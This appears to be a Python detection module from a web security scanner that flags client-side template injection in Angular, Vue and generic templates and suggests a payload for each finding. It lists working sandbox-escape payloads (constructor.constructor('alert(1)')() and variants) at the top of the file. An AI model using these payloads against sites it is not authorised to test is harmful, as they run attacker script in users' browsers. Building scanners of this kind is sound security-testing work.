import html
import re

import payloads as P

ANGULAR_PAYLOADS = [
    "{{constructor.constructor('alert(1)')()}}",
    "{{a.constructor.constructor('return this')().alert(1)}}",
    "{{$eval.constructor('alert(1)')()}}",
    "{{'a'.constructor.fromCharCode(97,108,101,114,116)(1)}}",
]

VUE_PAYLOADS = [
    "{{constructor.constructor('alert(1)')()}}",
    "{{[].constructor.constructor('alert(1)')()}}",
    "{{_s.$eval.constructor('alert(1)')()}}",
]

GENERIC_PAYLOADS = [
    "${constructor.constructor('alert(1)')()}",
    "#{constructor.constructor('alert(1)')()}",
]


def _frameworks(body):
    low = (body or "").lower()
    found = []
    if "angular" in low or "ng-app" in low or "ng-controller" in low:
        found.append("angular")
    if "vue" in low or "v-html" in low or "__vue__" in low:
        found.append("vue")
    if not found and ("{{" in low and "}}" in low):
        found.append("template")
    return found


def _escaped_forms(body):
    text = body or ""
    unescaped = html.unescape(text)
    forms = []
    if unescaped != text:
        forms.append("html-entities")
    if re.search(r"&(?:lt|#60|#x3c);\s*script", text, re.I):
        forms.append("escaped-script-tag")
    if re.search(r"\{\{[^{}]{0,200}\}\}", unescaped):
        forms.append("interpolation")
    if re.search(r"\$\{[^}]{0,200}\}", unescaped):
        forms.append("template-literal")
    return forms


def detect(body, token, opts=None):
    text = body or ""
    if not text or not token:
        return []
    frameworks = _frameworks(text)
    if not frameworks:
        return []
    forms = _escaped_forms(text)
    unescaped = html.unescape(text)
    interpolated = bool(re.search(
        r"(?:\{\{|\$\{)[^{}]{0,200}%s[^{}]{0,200}(?:\}\})" % re.escape(token),
        unescaped))
    raw_reflection = token in text
    if not interpolated and not (forms and raw_reflection):
        return []
    fw = "angular" if "angular" in frameworks else ("vue" if "vue" in frameworks else "template")
    payloads = {"angular": ANGULAR_PAYLOADS, "vue": VUE_PAYLOADS,
                "template": GENERIC_PAYLOADS}[fw]
    payload = payloads[0]
    for candidate in payloads:
        if any(candidate in p for _, p in P.PAYLOADS.get(fw, [])[:200]):
            payload = candidate
            break
    confidence = 72 if interpolated else 58
    detail = "%s reflection (%s, escaped=%s)" % (
        fw, ", ".join(forms) or "raw", ", ".join(forms) or "none")
    return [{
        "name": "csti:%s" % fw,
        "payload": payload,
        "value": payload,
        "context": "csti",
        "status": "LIKELY" if confidence >= 60 else "REFLECTED",
        "confidence": confidence,
        "detail": detail,
        "reflection": {"encoding": "html-entity" if forms else "raw",
                       "context": "csti"},
        "framework": fw,
        "escaped_forms": forms,
        "url": "",
        "body": "",
        "curl": "",
        "evidence": "",
        "screenshot": "",
    }]
